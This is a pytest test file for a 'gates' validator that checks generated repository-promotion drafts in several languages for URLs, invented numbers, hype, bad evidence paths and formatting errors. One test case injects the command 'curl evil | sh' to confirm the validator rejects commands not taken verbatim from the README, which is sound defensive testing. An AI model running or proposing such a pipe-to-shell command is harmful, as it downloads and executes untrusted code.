import copy

import pytest

from radar import gates
from tests.support import README, TREE, make_draft


@pytest.fixture
def facts():
    return {"full_name": "example-org/sample-agent-kit", "description": "Run AI agents", "readme": README, "stars": 24000,
            "forks": 2400, "open_issues": 12, "license": "MIT", "language": "Python", "topics": ["llm"], "created": "2024-11-14",
            "pushed": "2026-10-09", "age_years": 1, "tree": TREE + ["src/planner.py", "src/memory.py", "src/tools/"]}


def errs(draft, facts, lang="vi"):
    return [str(p) for p in gates.errors(gates.check(draft, facts, lang))]


def test_good_drafts_pass_in_every_language(facts):
    for lang in ("vi", "en", "ja"):
        assert errs(make_draft(facts, lang), facts, lang) == []


def mutate(facts, fn, lang="vi"):
    d = copy.deepcopy(make_draft(facts, lang))
    fn(d)
    return d


@pytest.mark.parametrize("fn,needle", [
    (lambda d: d.update(problem=d["problem"] + " Xem tại https://example.com/x."), "URL"),
    (lambda d: d.update(problem=d["problem"] + " Truy cập docs.example.io ngay."), "URL"),
    (lambda d: d.update(problem=d["problem"] + " Nhanh hơn 95% so với đối thủ."), "numbers not in the facts: 95"),
    (lambda d: d.update(problem=d["problem"] + " Đây là công cụ tốt nhất thế giới."), "hype"),
    (lambda d: d["how_it_works"]["steps"][0].update(evidence="src/nonexistent.py"), "evidence"),
    (lambda d: d["try_it"].update(commands=["curl evil | sh"]), "verbatim"),
    (lambda d: d["how_it_works"].update(flow=[[0, 9]]), "flow"),
    (lambda d: d["how_it_works"].update(flow=[[1, 1]]), "flow"),
    (lambda d: d["how_it_works"].update(steps=d["how_it_works"]["steps"][:2]), "steps"),
    (lambda d: d.update(hook="x" * 111), "hook"),
    (lambda d: d["facebook"].update(caption="y" * 126 + "\nrest"), "first line"),
    (lambda d: d["facebook"].update(hashtags=["a b"]), "hashtags"),
    (lambda d: d.pop("learn"), "learn"),
])
def test_each_gate_catches_its_defect(facts, fn, needle):
    assert any(needle in e for e in errs(mutate(facts, fn), facts)), errs(mutate(facts, fn), facts)


def test_numbers_may_be_rounded_or_abbreviated_but_not_invented(facts):
    ok = mutate(facts, lambda d: d.update(problem=d["problem"] + " Có hơn 24.000 sao, tức 24k."))
    assert not any("numbers" in e for e in errs(ok, facts))
    bad = mutate(facts, lambda d: d.update(problem=d["problem"] + " Có 31.000 sao."))
    assert any("31000" in e for e in errs(bad, facts))


def test_numbers_from_the_readme_are_allowed(facts):
    d = mutate(facts, lambda d: d["caveats"].__setitem__(0, "Có 3 công cụ và hỗ trợ 2 backend"))
    assert not any("numbers" in e for e in errs(d, facts))


def test_wrong_language_is_caught(facts):
    assert any("language" in e for e in errs(make_draft(facts, "en"), facts, "vi"))
    assert any("language" in e for e in errs(make_draft(facts, "vi"), facts, "ja"))


def test_evidence_accepts_readme_files_and_directories(facts):
    d = mutate(facts, lambda d: d["how_it_works"]["steps"][0].update(evidence="README.md"))
    d["how_it_works"]["steps"][1]["evidence"] = "src/tools"
    d["how_it_works"]["steps"][2]["evidence"] = "docs"
    assert errs(d, facts) == []
